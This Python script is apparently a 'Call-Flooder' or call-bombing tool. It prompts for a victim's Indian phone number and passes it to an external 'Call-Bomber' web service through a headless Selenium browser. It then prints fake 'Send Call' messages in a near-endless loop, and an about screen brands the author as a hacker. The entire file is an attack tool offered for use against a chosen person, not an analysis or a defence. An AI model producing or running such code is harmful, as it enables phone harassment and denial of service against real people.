from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.common.exceptions import StaleElementReferenceException as SERE
from selenium.common.exceptions import NoSuchElementException as NSEE
from selenium.common.exceptions import TimeoutException as TE
import time
import os
from fun.logo import *

black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

def about():
    print(f"""
    {bblue}I am KDO. I am working in Cyber-D Team. 
    I am a Programmer, Hacker, Developer, Rapper and
    as well as Student. 

    """)

def main():
    user=input(f"{green}->Enter The victem number +91:{yellow}")
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    option = Options()
    s = Service("chromedriver.exe")
    time.sleep(2)
    browser = webdriver.Chrome(options=options)
    # browser = webdriver.Chrome("chromedriver.exe", options=option)
    browser.get("https://claimbooster.in/Call-Bomber/index.php?mobile="+user+"&submit=Bomb")
    print(f"{red}->Stating Call-Flooder")
    time.sleep(10)
    for i in range(9999999999):
        print(f"{red}->Send Call on "+ user)
        time.sleep(0.8)

def options():
    optiom=input(f"{green}Choose an Option:{yellow}")
    if optiom=="1":
        os.system("clear")
        print(logo)
        print(meanu)
        main()
    elif optiom=="2":
        about()
    elif optiom=="3":
        print(f"{bblue}Thank {bgreen}For {bred}This {bcyan}Tool")
